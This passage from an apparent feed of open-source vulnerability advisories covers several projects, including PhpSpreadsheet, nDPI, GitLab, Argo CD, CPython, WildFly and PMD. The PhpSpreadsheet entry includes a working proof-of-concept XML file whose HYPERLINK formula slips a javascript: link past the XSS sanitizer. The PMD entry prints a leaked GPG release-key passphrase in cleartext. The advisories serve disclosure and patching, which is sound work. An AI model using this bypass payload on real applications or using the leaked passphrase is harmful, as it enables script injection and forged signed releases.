[2] [Report: Class Pollution leading to RCE in pydash](https:&#x2F;&#x2F;gist.github.com&#x2F;CalumHutton&#x2F;45d33e9ea55bf4953b3b31c84703dfca)

[3] [Blog: Prototype Pollution in Python](https:&#x2F;&#x2F;blog.abdulrah33m.com&#x2F;prototype-pollution-in-python&#x2F;)

[4] [Blog: Class Pollution Gadgets in Jinja Leading to RCE](https:&#x2F;&#x2F;www.offensiveweb.com&#x2F;docs&#x2F;programming&#x2F;python&#x2F;class-pollution&#x2F;)
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-r57h-547h-w24f: 5.4 | <b>PhpSpreadsheet allows bypassing of XSS sanitizer using the javascript protocol and special characters</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-r57h-547h-w24f</link>
                    <pubDate>2025-02-03T15:39:31Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-r57h-547h-w24f'>https://osv.dev/vulnerability/GHSA-r57h-547h-w24f</a><br>
                            <b>Published:</b> 2025-02-03T15:39:31Z<br>
                            <b>Severity:</b> 5.4<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-r57h-547h-w24f'>https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-r57h-547h-w24f</a></li><li>- <a target='_blank' href='https://github.com/PHPOffice/PhpSpreadsheet/commit/cde2926a9e2baf146783f8fd1771bbed7d1dc7b3'>https://github.com/PHPOffice/PhpSpreadsheet/commit/cde2926a9e2baf146783f8fd1771bbed7d1dc7b3</a></li><li>- <a target='_blank' href='https://github.com/PHPOffice/PhpSpreadsheet'>https://github.com/PHPOffice/PhpSpreadsheet</a></li></ul><br>
                            <b>Details:</b> <b>PhpSpreadsheet allows bypassing of XSS sanitizer using the javascript protocol and special characters</b><br>**Product:** PhpSpreadsheet
**Version:** 3.8.0
**CWE-ID:** CWE-79: Improper Neutralization of Input During Web Page Generation (&#x27;Cross-site Scripting&#x27;)
**CVSS vector v.3.1:** 5.4 (AV:N&#x2F;AC:L&#x2F;PR:L&#x2F;UI:R&#x2F;S:C&#x2F;C:L&#x2F;I:L&#x2F;A:N)
**CVSS vector v.4.0:** 4.8 (AV:N&#x2F;AC:L&#x2F;AT:N&#x2F;PR:L&#x2F;UI:A&#x2F;VC:L&#x2F;VI:L&#x2F;VA:N&#x2F;SC:L&#x2F;SI:L&#x2F;SA:N)
**Description:** an attacker can use special characters, so that the library processes the javascript protocol with special characters and generates an HTML link
**Impact:** executing arbitrary JavaScript code in the browser
**Vulnerable component:** class `PhpOffice\PhpSpreadsheet\Writer\Html`, method `generateRow`
**Exploitation conditions:** a user viewing a specially generated xml file
**Mitigation:** additional sanitization of special characters in a string
**Researcher: Igor Sak-Sakovskiy (Positive Technologies)**

# Research

The researcher discovered zero-day vulnerability Bypass XSS sanitizer using the javascript protocol and special characters in Phpspreadsheet.
The following code is written on the server, which translates the XML file into an HTML representation and displays it in the response.

*Listing 4. Source code on the server*

```
&amp;lt;?php

require __DIR__ . &#x27;&#x2F;vendor&#x2F;autoload.php&#x27;;

$inputFileType = &#x27;Xml&#x27;;
$reader = \PhpOffice\PhpSpreadsheet\IOFactory::createReader($inputFileType);  

$inputFileName = &#x27;.&#x2F;doc&#x2F;file.xml&#x27;;
$spreadsheet = $reader-&amp;gt;load($inputFileName); 
 
$writer = new \PhpOffice\PhpSpreadsheet\Writer\Html($spreadsheet); 
print($writer-&amp;gt;generateHTMLAll());
```
The contents of the xml file - `.&#x2F;doc&#x2F;file.xml`

*Listing 5. The contents of the xml file*
```
&amp;lt;?xml version=&quot;1.0&quot;?&amp;gt; 
&amp;lt;?mso-application progid=&quot;Excel.Sheet&quot;?&amp;gt; 
&amp;lt;Workbook xmlns=&quot;urn:schemas-microsoft-com:office:spreadsheet&quot; 
 xmlns:o=&quot;urn:schemas-microsoft-com:office:office&quot; 
 xmlns:x=&quot;urn:schemas-microsoft-com:office:excel&quot; 
 xmlns:ss=&quot;urn:schemas-microsoft-com:office:spreadsheet&quot; 
 xmlns:html=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;TR&#x2F;REC-html40&quot;&amp;gt; 
 &amp;lt;DocumentProperties xmlns=&quot;urn:schemas-microsoft-com:office:office&quot;&amp;gt; 
  &amp;lt;Author&amp;gt;author&amp;lt;&#x2F;Author&amp;gt; 
  &amp;lt;LastAuthor&amp;gt;author&amp;lt;&#x2F;LastAuthor&amp;gt; 
  &amp;lt;Created&amp;gt;2015-06-05T18:19:34Z&amp;lt;&#x2F;Created&amp;gt; 
  &amp;lt;LastSaved&amp;gt;2024-12-25T10:16:07Z&amp;lt;&#x2F;LastSaved&amp;gt; 
  &amp;lt;Version&amp;gt;16.00&amp;lt;&#x2F;Version&amp;gt; 
 &amp;lt;&#x2F;DocumentProperties&amp;gt; 
 &amp;lt;OfficeDocumentSettings xmlns=&quot;urn:schemas-microsoft-com:office:office&quot;&amp;gt; 
  &amp;lt;AllowPNG&#x2F;&amp;gt; 
 &amp;lt;&#x2F;OfficeDocumentSettings&amp;gt; 
 &amp;lt;ExcelWorkbook xmlns=&quot;urn:schemas-microsoft-com:office:excel&quot;&amp;gt; 
  &amp;lt;WindowHeight&amp;gt;11020&amp;lt;&#x2F;WindowHeight&amp;gt; 
  &amp;lt;WindowWidth&amp;gt;19420&amp;lt;&#x2F;WindowWidth&amp;gt; 
  &amp;lt;WindowTopX&amp;gt;32767&amp;lt;&#x2F;WindowTopX&amp;gt; 
  &amp;lt;WindowTopY&amp;gt;32767&amp;lt;&#x2F;WindowTopY&amp;gt; 
  &amp;lt;ProtectStructure&amp;gt;False&amp;lt;&#x2F;ProtectStructure&amp;gt; 
  &amp;lt;ProtectWindows&amp;gt;False&amp;lt;&#x2F;ProtectWindows&amp;gt; 
 &amp;lt;&#x2F;ExcelWorkbook&amp;gt; 
 &amp;lt;Styles&amp;gt; 
  &amp;lt;Style ss:ID=&quot;Default&quot; ss:Name=&quot;Normal&quot;&amp;gt; 
   &amp;lt;Alignment ss:Vertical=&quot;Bottom&quot;&#x2F;&amp;gt; 
   &amp;lt;Borders&#x2F;&amp;gt; 
   &amp;lt;Font ss:FontName=&quot;Calibri&quot; x:Family=&quot;Swiss&quot; ss:Size=&quot;11&quot; ss:Color=&quot;#000000&quot;&#x2F;&amp;gt; 
   &amp;lt;Interior&#x2F;&amp;gt; 
   &amp;lt;NumberFormat&#x2F;&amp;gt; 
   &amp;lt;Protection&#x2F;&amp;gt; 
  &amp;lt;&#x2F;Style&amp;gt; 
  &amp;lt;Style ss:ID=&quot;s16&quot;&amp;gt; 
   &amp;lt;NumberFormat ss:Format=&quot;General Date&quot;&#x2F;&amp;gt; 
  &amp;lt;&#x2F;Style&amp;gt; 
 &amp;lt;&#x2F;Styles&amp;gt; 
 &amp;lt;Worksheet ss:Name=&quot;Лист1&quot;&amp;gt; 
  &amp;lt;Table ss:ExpandedColumnCount=&quot;2&quot; ss:ExpandedRowCount=&quot;6&quot; x:FullColumns=&quot;1&quot; 
   x:FullRows=&quot;1&quot; ss:DefaultRowHeight=&quot;14.5&quot;&amp;gt; 
   &amp;lt;Column ss:AutoFitWidth=&quot;0&quot; ss:Width=&quot;194&quot;&#x2F;&amp;gt; 
   &amp;lt;Row&amp;gt; 
     &amp;lt;Cell ss:Formula=&quot;=HYPERLINK (CHAR(20) &amp;amp; &amp;quot;j&amp;quot; &amp;amp; CHAR(13) &amp;amp; &amp;quot;avascript:alert(1)&amp;quot;)&quot;&amp;gt;&amp;lt;Data ss:Type=&quot;String&quot;&amp;gt;&amp;lt;&#x2F;Data&amp;gt;&amp;lt;&#x2F;Cell&amp;gt; 
   &amp;lt;&#x2F;Row&amp;gt; 
  &amp;lt;&#x2F;Table&amp;gt; 
  &amp;lt;WorksheetOptions xmlns=&quot;urn:schemas-microsoft-com:office:excel&quot;&amp;gt; 
   &amp;lt;PageSetup&amp;gt; 
    &amp;lt;Header x:Margin=&quot;0.3&quot;&#x2F;&amp;gt; 
    &amp;lt;Footer x:Margin=&quot;0.3&quot;&#x2F;&amp;gt; 
    &amp;lt;PageMargins x:Bottom=&quot;0.75&quot; x:Left=&quot;0.7&quot; x:Right=&quot;0.7&quot; x:Top=&quot;0.75&quot;&#x2F;&amp;gt; 
   &amp;lt;&#x2F;PageSetup&amp;gt; 
   &amp;lt;Selected&#x2F;&amp;gt; 
   &amp;lt;TopRowVisible&amp;gt;1&amp;lt;&#x2F;TopRowVisible&amp;gt; 
   &amp;lt;Panes&amp;gt; 
    &amp;lt;Pane&amp;gt; 
     &amp;lt;Number&amp;gt;3&amp;lt;&#x2F;Number&amp;gt; 
     &amp;lt;ActiveRow&amp;gt;6&amp;lt;&#x2F;ActiveRow&amp;gt; 
    &amp;lt;&#x2F;Pane&amp;gt; 
   &amp;lt;&#x2F;Panes&amp;gt; 
   &amp;lt;ProtectObjects&amp;gt;False&amp;lt;&#x2F;ProtectObjects&amp;gt; 
   &amp;lt;ProtectScenarios&amp;gt;False&amp;lt;&#x2F;ProtectScenarios&amp;gt; 
  &amp;lt;&#x2F;WorksheetOptions&amp;gt; 
 &amp;lt;&#x2F;Worksheet&amp;gt;
&amp;lt;&#x2F;Workbook&amp;gt;
```

Due to the load with a special character in front of the javascript protocol, the execution flow hits line 1595, not 1593.
 
*Figure 4. Generating a link bypassing a regular expression*
![fig4](https:&#x2F;&#x2F;github.com&#x2F;user-attachments&#x2F;assets&#x2F;9bd2299d-9045-4cab-b3a5-cbcaf3bbe23c)

In the response from the server, you can see which special character is located in front of the javascript protocol after conversion.
 
*Figure 5. Response from the server with a special character*
![fig5](https:&#x2F;&#x2F;github.com&#x2F;user-attachments&#x2F;assets&#x2F;3fecbd9b-b08e-4797-9f5d-06911f857059)

When viewing the rendered result, a link becomes visible in the browser, and when clicked, the embedded JavaScript code will be executed.

*Figure 6. Executing JavaScript code*
&amp;lt;img width=&quot;595&quot; alt=&quot;fig6&quot; src=&quot;https:&#x2F;&#x2F;github.com&#x2F;user-attachments&#x2F;assets&#x2F;b8ff1aeb-ba3b-49c1-a3b4-9e2cc1fc52d1&quot; &#x2F;&amp;gt;
_____________________________________________

## Credit

Igor Sak-Sakovskiy (Positive Technologies)
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>OSV-2025-88: 0 | <b>Segv on unknown address in ___interceptor_free</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#OSV-2025-88</link>
                    <pubDate>2025-02-02T00:16:16.201801Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/OSV-2025-88'>https://osv.dev/vulnerability/OSV-2025-88</a><br>
                            <b>Published:</b> 2025-02-02T00:16:16.201801Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://bugs.chromium.org/p/oss-fuzz/issues/detail?id=393435814'>https://bugs.chromium.org/p/oss-fuzz/issues/detail?id=393435814</a></li></ul><br>
                            <b>Details:</b> <b>Segv on unknown address in ___interceptor_free</b><br>OSS-Fuzz report: https:&#x2F;&#x2F;bugs.chromium.org&#x2F;p&#x2F;oss-fuzz&#x2F;issues&#x2F;detail?id=393435814

```
Crash type: Segv on unknown address
Crash state:
___interceptor_free
ndpi_free_flow_data
ndpi_free_flow
```

                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>OSV-2025-85: 0 | <b>Segv on unknown address in ndpi_free_flow_data</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#OSV-2025-85</link>
                    <pubDate>2025-02-02T00:13:42.076001Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/OSV-2025-85'>https://osv.dev/vulnerability/OSV-2025-85</a><br>
                            <b>Published:</b> 2025-02-02T00:13:42.076001Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://bugs.chromium.org/p/oss-fuzz/issues/detail?id=393414230'>https://bugs.chromium.org/p/oss-fuzz/issues/detail?id=393414230</a></li></ul><br>
                            <b>Details:</b> <b>Segv on unknown address in ndpi_free_flow_data</b><br>OSS-Fuzz report: https:&#x2F;&#x2F;bugs.chromium.org&#x2F;p&#x2F;oss-fuzz&#x2F;issues&#x2F;detail?id=393414230

```
Crash type: Segv on unknown address
Crash state:
ndpi_free_flow_data
fuzz_process_packet.c
```

                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>OSV-2025-84: 0 | <b>Segv on unknown address in Flow::processExtraDissectedInformation</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#OSV-2025-84</link>
                    <pubDate>2025-02-02T00:12:09.563391Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/OSV-2025-84'>https://osv.dev/vulnerability/OSV-2025-84</a><br>
                            <b>Published:</b> 2025-02-02T00:12:09.563391Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://bugs.chromium.org/p/oss-fuzz/issues/detail?id=393435813'>https://bugs.chromium.org/p/oss-fuzz/issues/detail?id=393435813</a></li></ul><br>
                            <b>Details:</b> <b>Segv on unknown address in Flow::processExtraDissectedInformation</b><br>OSS-Fuzz report: https:&#x2F;&#x2F;bugs.chromium.org&#x2F;p&#x2F;oss-fuzz&#x2F;issues&#x2F;detail?id=393435813

```
Crash type: Segv on unknown address
Crash state:
Flow::processExtraDissectedInformation
Flow::setExtraDissectionCompleted
Flow::endProtocolDissection
```

                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>OSV-2025-81: 0 | <b>Segv on unknown address in ndpi_serialize_string_string</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#OSV-2025-81</link>
                    <pubDate>2025-02-02T00:02:52.946833Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/OSV-2025-81'>https://osv.dev/vulnerability/OSV-2025-81</a><br>
                            <b>Published:</b> 2025-02-02T00:02:52.946833Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://bugs.chromium.org/p/oss-fuzz/issues/detail?id=393404264'>https://bugs.chromium.org/p/oss-fuzz/issues/detail?id=393404264</a></li></ul><br>
                            <b>Details:</b> <b>Segv on unknown address in ndpi_serialize_string_string</b><br>OSS-Fuzz report: https:&#x2F;&#x2F;bugs.chromium.org&#x2F;p&#x2F;oss-fuzz&#x2F;issues&#x2F;detail?id=393404264

```
Crash type: Segv on unknown address
Crash state:
ndpi_serialize_string_string
ndpi_dpi2json
fuzz_process_packet.c
```

                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>OSV-2025-80: 0 | <b>Segv on unknown address in ndpi_snprintf</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#OSV-2025-80</link>
                    <pubDate>2025-02-02T00:00:58.798346Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/OSV-2025-80'>https://osv.dev/vulnerability/OSV-2025-80</a><br>
                            <b>Published:</b> 2025-02-02T00:00:58.798346Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://bugs.chromium.org/p/oss-fuzz/issues/detail?id=393420192'>https://bugs.chromium.org/p/oss-fuzz/issues/detail?id=393420192</a></li></ul><br>
                            <b>Details:</b> <b>Segv on unknown address in ndpi_snprintf</b><br>OSS-Fuzz report: https:&#x2F;&#x2F;bugs.chromium.org&#x2F;p&#x2F;oss-fuzz&#x2F;issues&#x2F;detail?id=393420192

```
Crash type: Segv on unknown address
Crash state:
ndpi_snprintf
process_ndpi_collected_info
ndpi_workflow_process_packet
```

                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>BIT-gitlab-2023-6195: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#BIT-gitlab-2023-6195</link>
                    <pubDate>2025-02-01T07:29:24.815Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/BIT-gitlab-2023-6195'>https://osv.dev/vulnerability/BIT-gitlab-2023-6195</a><br>
                            <b>Published:</b> 2025-02-01T07:29:24.815Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://gitlab.com/gitlab-org/gitlab/-/issues/432276'>https://gitlab.com/gitlab-org/gitlab/-/issues/432276</a></li><li>- <a target='_blank' href='https://hackerone.com/reports/2249268'>https://hackerone.com/reports/2249268</a></li></ul><br>
                            <b>Details:</b> <b></b><br>An issue has been discovered in GitLab CE&#x2F;EE affecting all versions starting from 15.5 prior to 16.9.7, starting from 16.10 prior to 16.10.5, and starting from 16.11 prior to 16.11.2. GitLab was vulnerable to Server Side Request Forgery when an attacker uses a malicious URL in the markdown  image value when importing a GitHub repository.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>BIT-gitlab-2024-1211: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#BIT-gitlab-2024-1211</link>
                    <pubDate>2025-02-01T07:26:58.828Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/BIT-gitlab-2024-1211'>https://osv.dev/vulnerability/BIT-gitlab-2024-1211</a><br>
                            <b>Published:</b> 2025-02-01T07:26:58.828Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://gitlab.com/gitlab-org/gitlab/-/issues/440313'>https://gitlab.com/gitlab-org/gitlab/-/issues/440313</a></li><li>- <a target='_blank' href='https://hackerone.com/reports/2323594'>https://hackerone.com/reports/2323594</a></li></ul><br>
                            <b>Details:</b> <b></b><br>An issue has been discovered in GitLab CE&#x2F;EE affecting all versions starting from 10.6 prior to 16.9.7, starting from 16.10 prior to 16.10.5, and starting from 16.11 prior to 16.11.2 in which cross-site request forgery may have been possible on GitLab instances configured to use JWT as an OmniAuth provider.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>BIT-argo-cd-2025-23216: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#BIT-argo-cd-2025-23216</link>
                    <pubDate>2025-02-01T07:09:00.719Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/BIT-argo-cd-2025-23216'>https://osv.dev/vulnerability/BIT-argo-cd-2025-23216</a><br>
                            <b>Published:</b> 2025-02-01T07:09:00.719Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/argoproj/argo-cd/commit/6f5537bdf15ddbaa0f27a1a678632ff0743e4107'>https://github.com/argoproj/argo-cd/commit/6f5537bdf15ddbaa0f27a1a678632ff0743e4107</a></li><li>- <a target='_blank' href='https://github.com/argoproj/argo-cd/security/advisories/GHSA-47g2-qmh2-749v'>https://github.com/argoproj/argo-cd/security/advisories/GHSA-47g2-qmh2-749v</a></li><li>- <a target='_blank' href='https://github.com/argoproj/gitops-engine/commit/7e21b91e9d0f64104c8a661f3f390c5e6d73ddca'>https://github.com/argoproj/gitops-engine/commit/7e21b91e9d0f64104c8a661f3f390c5e6d73ddca</a></li></ul><br>
                            <b>Details:</b> <b></b><br>Argo CD is a declarative, GitOps continuous delivery tool for Kubernetes. A vulnerability was discovered in Argo CD that exposed secret values in error messages and the diff view when an invalid Kubernetes Secret resource was synced from a repository. The vulnerability assumes the user has write access to the repository and can exploit it, either intentionally or unintentionally, by committing an invalid Secret to repository and triggering a Sync. Once exploited, any user with read access to Argo CD can view the exposed secret data. The vulnerability is fixed in v2.13.4, v2.12.10, and v2.11.13.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>PSF-2025-1: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#PSF-2025-1</link>
                    <pubDate>2025-01-31T17:51:35.898Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/PSF-2025-1'>https://osv.dev/vulnerability/PSF-2025-1</a><br>
                            <b>Published:</b> 2025-01-31T17:51:35.898Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/python/cpython/issues/105704'>https://github.com/python/cpython/issues/105704</a></li><li>- <a target='_blank' href='https://github.com/python/cpython/pull/129418'>https://github.com/python/cpython/pull/129418</a></li></ul><br>
                            <b>Details:</b> <b></b><br>The Python standard library functions `urllib.parse.urlsplit` and `urlparse` accepted domain names that included square brackets which isn&#x27;t valid according to RFC 3986. Square brackets are only meant to be used as delimiters for specifying IPv6 and IPvFuture hosts in URLs. This could result in differential parsing across the Python URL parser and other specification-compliant URL parsers.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-qr6x-62gq-4ccp: 6.5 | <b>WildFly improper RBAC permission</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-qr6x-62gq-4ccp</link>
                    <pubDate>2025-01-31T17:34:30Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-qr6x-62gq-4ccp'>https://osv.dev/vulnerability/GHSA-qr6x-62gq-4ccp</a><br>
                            <b>Published:</b> 2025-01-31T17:34:30Z<br>
                            <b>Severity:</b> 6.5<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/wildfly/wildfly-core/security/advisories/GHSA-qr6x-62gq-4ccp'>https://github.com/wildfly/wildfly-core/security/advisories/GHSA-qr6x-62gq-4ccp</a></li><li>- <a target='_blank' href='https://access.redhat.com/security/cve/CVE-2025-23367'>https://access.redhat.com/security/cve/CVE-2025-23367</a></li><li>- <a target='_blank' href='https://bugzilla.redhat.com/show_bug.cgi?id=2337620'>https://bugzilla.redhat.com/show_bug.cgi?id=2337620</a></li><li>- <a target='_blank' href='https://github.com/wildfly/wildfly-core'>https://github.com/wildfly/wildfly-core</a></li></ul><br>
                            <b>Details:</b> <b>WildFly improper RBAC permission</b><br>A flaw was found in the Wildfly Server Role Based Access Control (RBAC) provider. When authorization to control management operations is secured using the Role Based Access Control provider, a user without the required privileges can suspend or resume the server. A user with a Monitor or Auditor role is supposed to have only read access permissions and should not be able to suspend the server. The vulnerability is caused by the Suspend and Resume handlers not performing authorization checks to validate whether the current user has the required permissions to proceed with the action.

### Impact
Standalone server (Domain mode is not affected) with use access control enabled with RBAC provider can be suspended or resumed by unauthorized users. When a server is suspended, the server will stop receiving user requests. The resume handle does the opposite; it will cause a suspended server to start accepting user requests.

### Patches
Fixed in [WildFly Core 27.0.1.Final](https:&#x2F;&#x2F;github.com&#x2F;wildfly&#x2F;wildfly-core&#x2F;releases&#x2F;tag&#x2F;27.0.1.Final)

### Workarounds
No workaround available

### References
See also: https:&#x2F;&#x2F;issues.redhat.com&#x2F;browse&#x2F;WFCORE-7153

### Acknowledgements
The WildFly project would like to thank Claudia Bartolini (TIM S.p.A), Marco Ventura (TIM S.p.A), and Massimiliano Brolli (TIM S.p.A) for reporting this issue. https:&#x2F;&#x2F;www.gruppotim.it&#x2F;it&#x2F;footer&#x2F;red-team.html

                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-88m4-h43f-wx84: 0.0 | <b>PMD Designer&#x27;s release key passphrase (GPG) available on Maven Central in cleartext</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-88m4-h43f-wx84</link>
                    <pubDate>2025-01-31T17:34:09Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-88m4-h43f-wx84'>https://osv.dev/vulnerability/GHSA-88m4-h43f-wx84</a><br>
                            <b>Published:</b> 2025-01-31T17:34:09Z<br>
                            <b>Severity:</b> 0.0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/pmd/pmd/security/advisories/GHSA-88m4-h43f-wx84'>https://github.com/pmd/pmd/security/advisories/GHSA-88m4-h43f-wx84</a></li><li>- <a target='_blank' href='https://github.com/pmd/pmd-designer/commit/1548f5f27ba2981b890827fecbd0612fa70a0362'>https://github.com/pmd/pmd-designer/commit/1548f5f27ba2981b890827fecbd0612fa70a0362</a></li><li>- <a target='_blank' href='https://github.com/pmd/pmd-designer/commit/e87a45312753ec46b3e5576c6f6ac1f7de2f5891'>https://github.com/pmd/pmd-designer/commit/e87a45312753ec46b3e5576c6f6ac1f7de2f5891</a></li><li>- <a target='_blank' href='https://github.com/jvm-repo-rebuild/reproducible-central/blob/master/content/net/sourceforge/pmd/pmd-designer/README.md'>https://github.com/jvm-repo-rebuild/reproducible-central/blob/master/content/net/sourceforge/pmd/pmd-designer/README.md</a></li><li>- <a target='_blank' href='https://github.com/jvm-repo-rebuild/reproducible-central/blob/master/content/net/sourceforge/pmd/pmd-designer/pmd-designer-7.0.0.diffoscope'>https://github.com/jvm-repo-rebuild/reproducible-central/blob/master/content/net/sourceforge/pmd/pmd-designer/pmd-designer-7.0.0.diffoscope</a></li><li>- <a target='_blank' href='https://github.com/jvm-repo-rebuild/reproducible-central?tab=readme-ov-file#reproducible-builds-for-maven-central-repository'>https://github.com/jvm-repo-rebuild/reproducible-central?tab=readme-ov-file#reproducible-builds-for-maven-central-repository</a></li><li>- <a target='_blank' href='https://github.com/pmd/pmd'>https://github.com/pmd/pmd</a></li></ul><br>
                            <b>Details:</b> <b>PMD Designer&#x27;s release key passphrase (GPG) available on Maven Central in cleartext</b><br>### Summary
While rebuilding [PMD Designer](https:&#x2F;&#x2F;github.com&#x2F;pmd&#x2F;pmd-designer) for Reproducible Builds and digging into issues, I found out that passphrase for `gpg.keyname=0xD0BF1D737C9A1C22` is included in jar published to Maven Central.

### Details
See https:&#x2F;&#x2F;github.com&#x2F;jvm-repo-rebuild&#x2F;reproducible-central&#x2F;blob&#x2F;master&#x2F;content&#x2F;net&#x2F;sourceforge&#x2F;pmd&#x2F;pmd-designer&#x2F;README.md

I removed 2 lines from https:&#x2F;&#x2F;github.com&#x2F;jvm-repo-rebuild&#x2F;reproducible-central&#x2F;blob&#x2F;master&#x2F;content&#x2F;net&#x2F;sourceforge&#x2F;pmd&#x2F;pmd-designer&#x2F;pmd-designer-7.0.0.diffoscope but real content is:

```
├── net&#x2F;sourceforge&#x2F;pmd&#x2F;util&#x2F;fxdesigner&#x2F;designer.properties
│ @@ -1,14 +1,12 @@
│  #Properties
│  checkstyle.plugin.version=3.3.1
│  checkstyle.version=10.14.0
│ -gpg.keyname=0xD0BF1D737C9A1C22
│ -gpg.passphrase=evicx0nuPfvSVhVyeXpw
│  jar.plugin.version=3.3.0
│ -java.version=11.0.22
│ +java.version=11.0.25
│  javadoc.plugin.version=3.6.3
│  jflex-output=&#x2F;home&#x2F;runner&#x2F;work&#x2F;pmd-designer&#x2F;pmd-designer&#x2F;target&#x2F;generated-sources&#x2F;jflex
│  junit5.version=5.8.2
│  kotest.version=5.5.5
│  kotlin.version=1.7.20
│  local.lib.repo=&#x2F;home&#x2F;runner&#x2F;work&#x2F;pmd-designer&#x2F;pmd-designer&#x2F;lib&#x2F;mvn-repo
│  openjfx.scope=provided
```

### PoC
```
.&#x2F;rebuild.sh content&#x2F;net&#x2F;sourceforge&#x2F;pmd&#x2F;pmd-designer&#x2F;pmd-designer-7.0.0.buildspec
```

### Impact
After further analysis, the passphrase of the following two keys have been compromised:

1. `94A5 2756 9CAF 7A47 AFCA  BDE4 86D3 7ECA 8C2E 4C5B`: PMD Designer (Release Signing Key) &amp;lt;releases@pmd-code.org&amp;gt;
   This key has been used since 2019 with the release of [net.sourceforge.pmd:pmd-ui:6.14.0](https:&#x2F;&#x2F;repo.maven.apache.org&#x2F;maven2&#x2F;net&#x2F;sourceforge&#x2F;pmd&#x2F;pmd-ui&#x2F;6.14.0&#x2F;).
   The following versions are signed with the same key: 6.16.0, 6.17.0, 6.19.0.
2. `EBB2 41A5 45CB 17C8 7FAC  B2EB D0BF 1D73 7C9A 1C22`: PMD Release Signing Key &amp;lt;releases@pmd-code.org&amp;gt;
   This key has been used since 2020 with the release of [net.sourceforge.pmd:pmd-ui:6.21.0](https:&#x2F;&#x2F;repo.maven.apache.org&#x2F;maven2&#x2F;net&#x2F;sourceforge&#x2F;pmd&#x2F;pmd-ui&#x2F;6.21.0&#x2F;)
   and all the other modules of PMD such as [net.sourceforge.pmd:pmd-core:6.21.0](https:&#x2F;&#x2F;repo.maven.apache.org&#x2F;maven2&#x2F;net&#x2F;sourceforge&#x2F;pmd&#x2F;pmd-core&#x2F;6.21.0&#x2F;).  
   This key has also been used for PMD 7, for the designer, e.g. [net.sourceforge.pmd:pmd-designer:7.0.0](https:&#x2F;&#x2F;repo.maven.apache.org&#x2F;maven2&#x2F;net&#x2F;sourceforge&#x2F;pmd&#x2F;pmd-designer&#x2F;7.0.0&#x2F;)
   and [net.sourceforge.pmd:pmd-core:7.0.0](https:&#x2F;&#x2F;repo.maven.apache.org&#x2F;maven2&#x2F;net&#x2F;sourceforge&#x2F;pmd&#x2F;pmd-core&#x2F;7.0.0&#x2F;).
   The versions between 6.21.0 and 7.9.0 are signed with this key.  
